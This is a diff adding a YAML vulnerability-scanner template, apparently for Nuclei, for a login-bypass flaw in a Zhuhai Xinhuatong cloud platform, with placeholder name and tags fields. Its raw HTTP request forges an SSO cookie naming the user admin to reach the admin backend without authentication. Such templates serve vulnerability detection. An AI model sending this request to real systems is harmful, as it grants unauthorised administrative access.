@@ -1,0 +1,30 @@
+id: zhxhpt-login-bypass
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 珠海新华通软件股份有限公司云平台存在登录绕过漏洞，漏洞允许攻击者通过简单操作，如添加特定Cookie或修改请求参数，绕过身份验证直接访问后台，从而对系统安全构成严重威胁。
+  reference:
+    - https://github.com/wy876/POC/blob/2fdfb36b6f8f039319461fd394e980d959ca062e/%E7%8F%A0%E6%B5%B7%E6%96%B0%E5%8D%8E%E9%80%9A%E8%BD%AF%E4%BB%B6%E8%82%A1%E4%BB%BD%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8/%E7%8F%A0%E6%B5%B7%E6%96%B0%E5%8D%8E%E9%80%9A%E8%BD%AF%E4%BB%B6%E8%82%A1%E4%BB%BD%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E4%BA%91%E5%B9%B3%E5%8F%B0%E5%AD%98%E5%9C%A8%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+http:
+  - raw:
+      - |+
+        POST /Main/Desktop/Default.aspx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 0
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded;
+        Accept: */*
+        Origin: http://{{Hostname}}
+        Referer: http://{{Hostname}}/
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: ASP.NET_SessionId=x01ftldfm5dwbbo1tx1ne1kv; #_SSO_Login_UserID=admin; #_SSO_Login_UserID_Guid=
+        Connection: close
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '后台管理'
